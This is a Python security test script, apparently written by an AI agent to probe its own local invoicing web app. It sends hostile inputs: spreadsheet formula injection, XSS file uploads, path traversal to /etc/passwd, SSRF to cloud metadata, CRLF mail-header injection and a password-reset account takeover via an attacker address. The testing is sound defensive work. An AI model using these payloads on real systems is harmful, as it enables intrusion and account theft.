"""Sicherheitsproben Teil 2. Baut auf sich1.py auf (Benutzer werk/mita/buero vorhanden, Inhaber jonas/geheim123)."""
import json, re, sys, base64, time, io, zipfile, socket, socketserver, threading, os
exec(open("/tmp/claude-0/t/sec/sec.py").read().split("inh = cl()")[0])
J = lambda t: json.loads(t) if t and t[:1] in "[{" else {}
inh = cl(); rq(inh, "POST", "/api/anmeldung/anmelden", {"login": "jonas", "passwort": "geheim123"})
def A(m, p, d=None, c=None, h=None):
    s, b, hd = rq(c or inh, m, "/api/" + p, d, h); j = J(b)
    if isinstance(j, dict): j["_s"] = s
    else: j = {"_s": s, "liste": j}
    return j
def anmelden(login, pw):
    c = cl(); s, b, _ = rq(c, "POST", "/api/anmeldung/anmelden", {"login": login, "passwort": pw}); return c, s
PW = "Pruefung#2026"
POST = []
class H(socketserver.StreamRequestHandler):
    def handle(self):
        w = lambda t: self.wfile.write((t + "\r\n").encode())
        w("220 test ESMTP")
        while True:
            z = self.rfile.readline()
            if not z: return
            k = z.decode("utf-8", "replace").strip().upper()
            if k.startswith("EHLO"): w("250-test"); w("250-AUTH PLAIN LOGIN"); w("250 8BITMIME")
            elif k.startswith("AUTH"): w("235 ok")
            elif k.startswith("DATA"):
                w("354 los"); roh = b""
                while not roh.endswith(b"\r\n.\r\n"): roh += self.rfile.readline()
                POST.append(roh); w("250 ok")
            elif k.startswith("QUIT"): w("221 bye"); return
            else: w("250 ok")
srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
r = A("PUT", "einstellungen", {"firma": "Muster GmbH", "firma_anschrift": "Weg 1\n88069 Tettnang", "steuernummer": "12/345/67890", "sepa_iban": "DE02120300000000202051", "ustid": "DE123456789",
                               "mail": {"adresse": "ich@beispiel.de", "smtp_server": "127.0.0.1", "smtp_port": srv.server_address[1], "smtp_modus": "keine", "passwort": "x", "gesendet_ablegen": False}})
print("Einstellungen", r["_s"], r.get("fehler", ""))
k = A("POST", "kunden", {"kurzname": "=HYPERLINK(\"http://boese.example\";\"Klick\")", "nachname": "+cmd|' /C calc'!A0", "strasse": "@SUM(1+1)", "plz": "88099", "ort": "-2+3", "email1": "kunde@beispiel.de"})
a = A("POST", "auftraege", {"kunde_id": k["id"], "bezeichnung": "Garderobe"})
po = A("POST", f"auftraege/{a['id']}/positionen", {"text": "Garderobe"}); pid = po.get("id") or po["position"]["id"]
A("PUT", f"positionen/{pid}", {"einzelpreis": 1234.56, "preis_manuell": 1, "menge": 1})
b = A("POST", f"auftraege/{a['id']}/belege", {"art": "rechnung"}); bid = b.get("id")
f = A("POST", f"belege/{bid}/festschreiben", {}); print("Rechnung", bid, "fest:", f["_s"], f.get("fehler", ""), f.get("nummer", ""))
sitz = {lg: anmelden(lg, PW)[0] for lg in ("werk", "mita")}; sitz["buero"] = anmelden("buero", "Neu#Passwort77")[0]
print("\n== A. E-Rechnungs-XML ohne Rechteregel")
for art in ("xrechnung", "zugferd"):
    print(" ", art, {lg: (lambda r: f"{r[0]} {len(r[1])} Zeichen" + (" BETRAG SICHTBAR" if "1234.56" in r[1] or "1469.13" in r[1] else ""))(rq(c, "GET", f"/api/belege/{bid}/{art}.xml")) for lg, c in sitz.items()})
print("  zum Vergleich /api/belege/<id> und /druck/<id>:", {lg: (rq(c, "GET", f"/api/belege/{bid}")[0], rq(c, "GET", f"/druck/{bid}")[0]) for lg, c in sitz.items()})
print("\n== B. Einstellungen für niedrige Rollen")
voll = A("GET", "einstellungen")
for lg in ("mita", "werk"):
    e = A("GET", "einstellungen", c=sitz[lg]); t = json.dumps(e, ensure_ascii=False)
    print(" ", lg, "Schlüssel:", len(e), "von", len(voll), "| heikel:", [w for w in ("DE0212", "12/345", "smtp", "passwort", "stundensatz", "gemeinkosten", "gewinn", "DE123456789", "lohn", "zuschlag", "projektpfad", "sicherung", "mahn", "skonto") if w.lower() in t.lower()])
    print("    ", sorted(e)[:80])
print("\n== C. Werkstatt (ohne Preise): Papiere und Listen mit Beträgen?")
arten = sorted(set(re.findall(r'art == "([a-z]+)"', open("/home/claude/eberle-buero/app.py", encoding="utf-8").read().split("def papier_html")[1].split("\ndef ")[0])))
print("  Papierarten im Code:", arten)
for p in [f"/papier/{a['id']}/{x}" for x in arten] + [f"/papier/{a['id']}/zuschnitt.csv", "/liste/lager", "/liste/werkzeuge", "/liste/etiketten", f"/papier/montage/1", f"/papier/bautagebuch/{a['id']}", "/zuschnitt/"]:
    s, t, _ = rq(sitz["werk"], "GET", p)
    geld = re.findall(r"\d[\d.]*,\d\d\s*(?:€|&euro;|EUR)", t) if s == 200 else []
    print("  %-34s %s %s" % (p, s, ("BETRÄGE: " + ", ".join(geld[:5])) if geld else ""))
print("\n== D. Kontoübernahme über „Passwort vergessen“")
ben = A("GET", "benutzer"); liste = ben.get("liste") or ben.get("benutzer") or []
print("  Form der Benutzerliste:", [k_ for k_ in ben if k_ != "_s"][:6], len(liste))
jo = [u for u in liste if u.get("login") == "jonas"][0]; print("  Inhaber: email=%r mitarbeiter_id=%r" % (jo.get("email"), jo.get("mitarbeiter_id")))
ma = A("GET", "mitarbeiter"); mliste = ma.get("liste") or ma.get("mitarbeiter") or []
m1 = [m for m in mliste if m.get("nachname") == "Werk"][0]["id"]
m3 = A("POST", "mitarbeiter", {"vorname": "Jonas", "nachname": "Chef", "email": "chef@beispiel.de"}); m3 = m3.get("id") or m3.get("mitarbeiter", {}).get("id")
r = A("PUT", f"benutzer/{jo['id']}", {"mitarbeiter_id": m3}); print("  Inhaber mit Mitarbeiter", m3, "verknüpft:", r["_s"], r.get("fehler", ""))
r = A("POST", "benutzer", {"name": "Lohnbüro", "login": "lohn", "passwort": PW, "rolle": "eigen", "eigen": {"bereiche": {"personal": 2}}}); print("  Benutzer lohn (nur Personal=2):", r["_s"], r.get("fehler", ""))
cl_, s = anmelden("lohn", PW)
r = A("PUT", f"mitarbeiter/{m3}", {"email": "angreifer@boese.example"}, c=cl_); print("  lohn ändert Mailadresse des Mitarbeiters des Inhabers:", r["_s"], r.get("fehler", ""))
anon = cl(); s, t, _ = rq(anon, "POST", "/api/anmeldung/vergessen", {"login": "jonas"}); print("  Code angefordert (ohne Anmeldung):", s, t[:120])
time.sleep(0.5)
if POST:
    import email
    m = email.message_from_bytes(POST[-1]); body = POST[-1].decode("utf-8", "replace")
    print("  Mail an:", m["To"], "| Betreff:", str(m["Subject"])[:80])
    code = re.search(r"\((\d{6})\)", str(m["Subject"]) or "") or re.search(r"Code: (\d{6})", body)
    if code and "boese" in str(m["To"]):
        s, t, _ = rq(anon, "POST", "/api/anmeldung/zuruecksetzen", {"login": "jonas", "code": code.group(1), "neu": "Gekapert#2026x"}); print("  Passwort des Inhabers mit dem Code gesetzt:", s, t[:100])
        c9, s9 = anmelden("jonas", "Gekapert#2026x"); print("  Anmeldung als Inhaber mit neuem Passwort:", s9, "| Rolle:", J(rq(c9, "GET", "/api/anmeldung")[1]).get("benutzer", {}).get("rolle"))
        if s9 == 200:
            inh = c9; print("  (Passwort zurück:", A("PUT", f"benutzer/{jo['id']}", {"passwort": "geheim123"})["_s"], ")")
            inh = cl(); rq(inh, "POST", "/api/anmeldung/anmelden", {"login": "jonas", "passwort": "geheim123"})
else:
    print("  keine Mail gesendet")
print("\n== E. Hochgeladene Dateien")
for name, inhalt in (("boese.html", b"<script>alert(1)</script>"), ("boese.svg", b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), ("ok.pdf", b"%PDF-1.4"), ("x.exe", b"MZ"), ("../../../hoch.txt", b"x"), ("CON.txt", b"x"), ("a" * 300 + ".txt", b"x")):
    r = A("POST", "anhaenge", {"kunde_id": k["id"], "dateiname": name, "daten": base64.b64encode(inhalt).decode()})
    hid = r.get("id")
    if hid:
        s, t, hd = rq(inh, "GET", f"/api/anhaenge/{hid}/datei")
        print("  %-22s angenommen als %-26s → %s %s | %s | CSP %s" % (name[:22], str(r.get("dateiname"))[:26], s, hd.get("Content-Type"), hd.get("Content-Disposition", "")[:28], hd.get("Content-Security-Policy", "")[:24]))
    else:
        print("  %-22s abgelehnt: %s %s" % (name[:22], r["_s"], r.get("fehler", "")[:90]))
print("\n== F. Pfadangaben")
for p in (f"/api/auftraege/{a['id']}/datei?pfad=../../../../etc/passwd", f"/api/auftraege/{a['id']}/datei?pfad=/etc/passwd", f"/api/auftraege/{a['id']}/datei?pfad=..%5C..%5Capp.py", "/api/service/datei/..%2F..%2Fapp.py", "/api/service/export/..%2Fbuero.db.zip",
          "/api/bild/0000000000000000", "/api/eingang/datei/00000000000000000000000000000000", "/hilfe/../../app.py", "/static/..%2fapp.py", "/%2e%2e/%2e%2e/app.py", "/app.py", "/daten/buero.db", "/benutzer.py"):
    s, t, _ = rq(inh, "GET", p); print("  %-62s %s %s" % (p, s, "!!! INHALT" if s == 200 and ("root:" in t or "import " in t or "SQLite" in t) else ""))
print("\n== G. Kalenderadresse (Datei-/Netzadressen)")
for url in ("file:///etc/passwd", "file:///etc/hostname", "http://127.0.0.1:8799/api/version", "ftp://127.0.0.1/x", "http://169.254.169.254/latest/meta-data/"):
    r = A("PUT", "einstellungen", {"google_kalender": [{"name": "T", "url": url, "farbe": "#888", "aktiv": True}]})
    kal = A("GET", "kalender?von=2026-11-01&bis=2026-11-30&neu=1")
    print("  %-46s speichern %s | Abruf %s | Meldung: %s" % (url, r["_s"], kal["_s"], json.dumps(kal.get("extern_fehler") or kal.get("fehler") or [x for x in kal if "fehl" in x], ensure_ascii=False)[:150]))
A("PUT", "einstellungen", {"google_kalender": []})
print("\n== H. Mail: Zeilenumbruch im Betreff/Empfänger")
v = A("GET", f"belege/{bid}/mail"); 
r = A("POST", f"belege/{bid}/mail", {"an": "kunde@beispiel.de", "betreff": "Rechnung\r\nBcc: heimlich@boese.example", "text": "Hallo", "anhaenge": ["beleg"]}); print("  Betreff mit CRLF:", r["_s"], r.get("fehler", "")[:100])
r2 = A("POST", f"belege/{bid}/mail", {"an": "kunde@beispiel.de\r\nBcc: heimlich@boese.example", "betreff": "Rechnung", "text": "Hallo", "anhaenge": ["beleg"]}); print("  Empfänger mit CRLF:", r2["_s"], r2.get("fehler", "")[:100])
time.sleep(0.5)
for roh in POST[-2:]:
    kopf = roh.split(b"\r\n\r\n")[0].decode("utf-8", "replace"); print("   Kopfzeilen gesendet:", [z for z in kopf.split("\r\n") if z.lower().startswith(("bcc", "subject", "to:"))][:4])
